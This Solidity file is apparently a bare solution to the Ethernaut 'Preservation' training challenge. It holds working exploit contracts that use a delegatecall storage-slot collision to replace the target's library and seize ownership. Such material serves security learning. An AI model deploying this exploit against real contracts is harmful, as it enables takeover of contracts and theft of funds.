// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
    function setFirstTime(uint) external;
    function setSecondTime(uint) external;
}

contract LibraryContract2 {
  uint firstSlot;
  uint secondSlot; 
  uint storedTime;  

  constructor() {}

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

contract PreservationAttack {
    IPreservation public ethernautInstance;
    LibraryContract2 public newLibrary;

    constructor(address instanceAddress, address newLibraryAddress) {
        ethernautInstance = IPreservation(instanceAddress);
        newLibrary = LibraryContract2(newLibraryAddress);
    }

    function changeLibrary() public {
        uint160 value = uint160(address(newLibrary));
        ethernautInstance.setFirstTime(value);
    }

    function attack() public {
        uint160 value = uint160(msg.sender);
        ethernautInstance.setFirstTime(value);
    }
}


